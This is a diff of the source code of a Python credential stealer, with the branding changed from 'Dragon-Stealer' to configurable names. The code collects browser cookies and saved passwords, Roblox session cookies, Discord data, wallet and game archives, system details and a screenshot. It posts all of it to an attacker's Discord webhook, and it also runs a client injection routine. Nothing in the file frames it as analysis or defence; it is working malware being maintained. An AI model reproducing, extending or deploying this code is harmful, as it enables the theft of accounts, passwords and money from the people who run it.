@@ -57,11 +57,12 @@ def writeforfile(data, name):
             if line[0] != "":
                 f.write(f"{line}\n")
 
-hook = cc.get_webhook()
+webhook = cc.get_webhook()
 debug_mode = cc.get_debug_mode()
-footer = cc.get_footer()
-avatar = cc.get_avatar()
-color = cc.get_color()
+wh_avatar = cc.get_avatar()
+wh_name = cc.get_name()
+eb_color = cc.get_color()
+eb_footer = cc.get_footer()
 
 
 local = os.getenv("LOCALAPPDATA")
@@ -71,8 +72,8 @@ Threadlist = []
 DETECTED = False
 
 
-payload = {"content": "<:titjob:1083098548977016932> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": "Dragon-Stealer", "avatar_url": avatar}
-response = requests.post(hook, json=payload)
+payload = {"content": "**AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": wh_name, "avatar_url": wh_avatar}
+response = requests.post(webhook, json=payload)
 
 class DATA_BLOB(Structure):
     _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]
@@ -173,13 +174,13 @@ class Injection:
 
 Passw = []
 
-def LoadUrlib(hook, data="", files="", headers=""):
+def LoadUrlib(webhook, data="", files="", headers=""):
     if headers != "":
-        r = urlopen(Request(hook, data=data, headers=headers))
+        r = urlopen(Request(webhook, data=data, headers=headers))
         print(r)
         return r
     else:
-        r = urlopen(Request(hook, data=data))
+        r = urlopen(Request(webhook, data=data))
         print(r)
         return r
 
@@ -235,23 +236,23 @@ def upload(name, link):
             "content":
             "",
             "embeds": [{
-                "title": "Dragon  -  Cookie Grabber",
+                "title": f"{wh_name}  -  Cookie Grabber",
                 "description":
-                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[DragonCookies.txt]({link})",
-                "color": color,
+                f"**Found**:\n{rb}\n\n**Data:**\n**{CookiCount}** Cookies Found\n[RoseCookies.txt]({link})",
+                "color": eb_color,
                 "footer": {
-                    "text": footer,
+                    "text": eb_footer,
                     "icon_url": "",
                 },
             }],
             "username":
-            "Dragon-Stealer",
+            wh_name,
             "avatar_url":
-            avatar,
+            wh_avatar,
             "attachments": [],
         }
-        #urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        #urlopen(Request(webhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "wppassw":
@@ -264,23 +265,23 @@ def upload(name, link):
             "content":
             "",
             "embeds": [{
-                "title": "Dragon  -  Password Grabber",
+                "title": f"{wh_name}  -  Password Grabber",
                 "description":
-                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[DragonPasswords.txt]({link})",
-                "color": color,
+                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[RosePasswords.txt]({link})",
+                "color": eb_color,
                 "footer": {
-                    "text": footer,
+                    "text": eb_footer,
                     "icon_url": "",
                 },
             }],
             "username":
-            "Dragon-Stealer",
+            wh_name,
             "avatar_url":
-            avatar,
+            wh_avatar,
             "attachments": [],
         }
-        #urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+        #urlopen(Request(webhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         return
 
 
@@ -372,9 +373,9 @@ def RobloxCookie(path, arg):
     shutil.copy2(pathC, tempfold)
     os.remove(tempfold)
     roblox_cookie = ""
-    with open(os.path.join(pathC, "Cookies", "DragonRobloxCookies.txt"), 'w', encoding="utf-8") as f:
+    with open(os.path.join(pathC, "Cookies", "RoseRobloxCookies.txt"), 'w', encoding="utf-8") as f:
         f.write(f"{footer}\n\n")
-        with open(os.path.join(pathC, "Cookies", "DragonCookies.txt"), 'r', encoding="utf-8") as f2:
+        with open(os.path.join(pathC, "Cookies", "RoseCookies.txt"), 'r', encoding="utf-8") as f2:
             try:
                 for line in f2:
                     if ".ROBLOSECURITY" in line:
@@ -395,8 +396,8 @@ def UploadRobloxCookie(webhook):
         "",
         "embeds": [{
             "color":
-            color,
-            "title": "Dragon  -  Roblox Cookie Grabber",
+            eb_color,
+            "title": f"{wh_name}  -  Roblox Cookie Grabber",
             "fields": [
                 {
                     "name": "<:roblox_icon:1041819334969937931> Name:",
@@ -414,18 +415,18 @@ def UploadRobloxCookie(webhook):
                 },
             ],
             "footer": {
-                "text": footer,
+                "text": eb_footer,
                 "icon_url": "",
             },
         }],
         "avatar_url":
-        avatar,
+        wh_avatar,
         "username":
-        "Dragon-Stealer",
+        wh_name,
         "attachments": [],
     }
-    urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
-    #LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
+    urlopen(Request(webhook, data=dumps(data).encode(), headers=headers))
+    #LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 
 def GetDiscord(path, arg):
@@ -512,18 +513,18 @@ def GatherZips(paths1, paths2, paths3):
         "content":
         "",
         "embeds": [{
-            "title": "Dragon  -  Zips",
+            "title": f"{wh_name}  -  Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": color,
+            "color": eb_color,
             "footer": {
-                "text": footer,
+                "text": eb_footer,
                 "icon_url": "",
             },
         }],
         "username":
-        "Dragon-Stealer",
+        wh_name,
         "avatar_url":
-        avatar,
+        wh_avatar,
         "attachments": [],
     }
 
@@ -955,7 +956,7 @@ OtherZip = []
 
 GatherAll()
 #RobloxCookie()
-Injection(hook)
+Injection(webhook)
 DETECTED = Trust(Cookies)
 DETECTED = False
 if not DETECTED:
@@ -993,11 +994,11 @@ name = (str(subprocess.check_output("wmic csproduct get name"),
 
 embed = {
     "title":
-    "Dragon  -  Extras",
+    f"{wh_name}  -  System",
     "description":
-    "Extra Information.",
+    "System Information.",
     "color":
-    color,
+    eb_color,
     "fields": [
         {
             "name": "User",
@@ -1013,12 +1014,12 @@ embed = {
     ],
 }
 
-requests.post(hook, json={"embeds": [embed]})
+requests.post(webhook, json={"embeds": [embed]})
 
 
 screenshot = ImageGrab.grab()
 screenshot.save("screenshot.png")
 files = {"screenshot": open("screenshot.png", "rb")}
-requests.post(hook, files=files)
+requests.post(webhook, files=files)
 files["screenshot"].close()
 os.remove("screenshot.png")
